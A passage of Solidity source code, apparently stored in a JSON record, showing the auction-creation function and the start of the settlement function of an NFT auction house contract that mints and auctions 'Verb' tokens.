contract.\n     */\n    function _createAuction() internal {\n        // Check if there's enough gas to safely execute token.mint() and subsequent operations\n        require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD, \"Insufficient gas for creating auction\");\n\n        try verbs.mint() returns (uint256 verbId) {\n            uint256 startTime = block.timestamp;\n            uint256 endTime = startTime + duration;\n\n            auction = Auction({\n                verbId: verbId,\n                amount: 0,\n                startTime: startTime,\n                endTime: endTime,\n                bidder: payable(0),\n                settled: false\n            });\n\n            emit AuctionCreated(verbId, startTime, endTime);\n        } catch {\n            _pause();\n        }\n    }\n\n    /**\n     * @notice Settle an auction, finalizing the bid and paying out to the owner. Pays out to the creator and the owner based on the creatorRateBps and entropyRateBps.\n     * @dev If there are no bids, the Verb is burned.\n     */\n    function _settleAuction() internal {\n        IAuctionHouse.Auction memory _auction = auction;\n\n        require(_auction.startTime != 0, \"Auction hasn't begun\");\n        require(!_auction.settled, \"Auction has already been settled\");\n        //slither-disable-next-line timestamp\n        require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\");\n\n        auction.settled = true;\n\n        uint256 creatorTokensEmitted = 0;\n        // Check if contract balance is greater than reserve price\n        if (address(this).balance < reservePrice) {\n            // If contract balance is less than reserve price, refund to the last bidder"
    }
  ]
}